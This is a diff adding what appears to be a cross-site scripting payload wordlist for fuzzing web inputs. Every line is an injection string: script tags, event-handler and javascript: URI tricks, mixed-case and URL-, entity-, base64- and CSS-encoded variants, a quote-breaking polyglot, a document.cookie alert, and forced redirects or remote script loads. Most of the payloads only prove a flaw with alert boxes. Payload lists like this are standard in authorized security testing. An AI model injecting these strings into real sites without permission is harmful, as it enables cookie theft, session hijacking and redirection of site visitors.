@@ -1,0 +1,63 @@
+')alert('xss');
+");alert('xss');
+<h1>XSS DETECTED by HR</h1> .html
+<script>alert('XSS')</script>
+<sCRiPt>alert('XSS')</ScRIpT>
+<0x736372697074>alert('XSS')</0x736372697074>
+<char(115,99,114,105,112,116)>alert('XSS')</char(115,99,114,105,112,116)>
+<0x736372697074>alert(String.fromCharCode(88, 83, 83))</0x736372697074>
+<char(115,99,114,105,112,116)>alert(String.fromCharCode(88, 83, 83))</char(115,99,114,105,112,116)>
+<script>alert(String.fromCharCode(88, 83, 83))</script>
+"><h1>XSS DETECTED by HR</h1> .html
+"><script>alert('XSS')</script>
+"><sCRiPt>alert('XSS')</ScRIpT>
+"><0x736372697074>alert('XSS')</0x736372697074>
+"><char(115,99,114,105,112,116)>alert('XSS')</char(115,99,114,105,112,116)>
+"><0x736372697074>alert(String.fromCharCode(88, 83, 83))</0x736372697074>
+"><char(115,99,114,105,112,116)>alert(String.fromCharCode(88, 83, 83))</char(115,99,114,105,112,116)>
+"><script>alert(String.fromCharCode(88, 83, 83))</script>
+%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E
+&#x22;&#x3E;&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
+&#34&#62&#60&#115&#99&#114&#105&#112&#116&#62&#97&#108&#101&#114&#116&#40&#39&#88&#83&#83&#39&#41&#60&#47&#115&#99&#114&#105&#112&#116&#62
+Ij48c2NyaXB0PmFsZXJ0KCdYU1MnKTwvc2NyaXB0Pg==
+<script>var myVar = XSS; alert(myVar)</script>
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88, 83, 83, 32, 98, 121, 32, 72, 82))//";alert(String.fromCharCode(88, 83, 83, 32, 98, 121, 32, 72, 82))//\";alert(String.fromCharCode(88, 83, 83, 32, 98, 121, 32, 72, 82))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88, 83, 83, 32, 98, 121, 32, 72, 82))</SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT>a=/XSS/
+alert(a.source)</SCRIPT>
+\";alert('XSS');//
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<img src=x onerror=alert(XSS);>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<BODY BACKGROUND="javascript:alert('XSS')">
+<onmouseover="javascript:alert('XSS')">
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<BODY ONLOAD=alert('XSS')>
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG SRC='vbscript:msgbox("XSS")'>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<DIV STYLE="width: expression(alert('XSS'));">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<BASE HREF="javascript:alert('XSS');//">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<script>alert(document.cookie)</script>
+%3Cscript%3alert(document.cookie);%3C%2Fscript%3
+<script>document.location='http://google.com';</script>
+<script>document.location='http://google.com'; ',5000</script>
+<SCRIPT SRC=http://google.com></SCRIPT>
+<SCRIPT/XSS SRC="http://google.com"></SCRIPT>
+<body onLoad="document.location.href='http://google.com'">
+<meta http-equiv="accion" content="10"; url="http://google.com" />
+<frameset rows="100%"><frame noresize="noresize" frameborder ="0" title="XSS Found by HR" src="http://google.com"></frame></frameset>
+<script>window.open( "http://www.google.com/" )</script>
+
